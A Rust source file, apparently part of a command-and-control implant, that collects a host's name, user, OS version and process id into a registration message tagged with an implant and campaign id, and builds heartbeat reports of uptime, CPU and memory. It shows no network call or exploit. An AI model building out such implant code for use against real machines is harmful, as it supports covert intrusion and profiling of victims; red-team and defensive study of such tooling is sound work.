use prost::Message;
use sysinfo::{System, SystemExt, ProcessExt};

pub fn gather_info(campaign_id: &str) -> crate::protocol::RegisterRequest {
    let mut sys = System::new_all();
    sys.refresh_all();
    
    let hostname = sys.host_name().unwrap_or_default();
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default();
    
    let os_version = format!(
        "{} {} {}",
        sys.name().unwrap_or_default(),
        sys.os_version().unwrap_or_default(),
        sys.kernel_version().unwrap_or_default()
    );
    
    let process_id = std::process::id();
    
    let mut metadata = std::collections::HashMap::new();
    metadata.insert("campaign_id".to_string(), campaign_id.to_string());
    metadata.insert("pid".to_string(), process_id.to_string());
    
    crate::protocol::RegisterRequest {
        implant_id: generate_implant_id(),
        hostname,
        username,
        os_version,
        process_id,
        public_key: vec![], // Would be actual key
        metadata,
    }
}

pub fn get_heartbeat() -> crate::protocol::Heartbeat {
    let mut sys = System::new();
    sys.refresh_cpu();
    sys.refresh_memory();
    
    crate::protocol::Heartbeat {
        uptime_seconds: sysinfo::System::uptime() as u32,
        cpu_percent: sys.global_cpu_info().cpu_usage(),
        memory_used_mb: sys.used_memory(),
    }
}

fn generate_implant_id() -> Vec<u8> {
    use rand::RngCore;
    let mut id = vec![0u8; 16];
    rand::thread_rng().fill_bytes(&mut id);
    id
}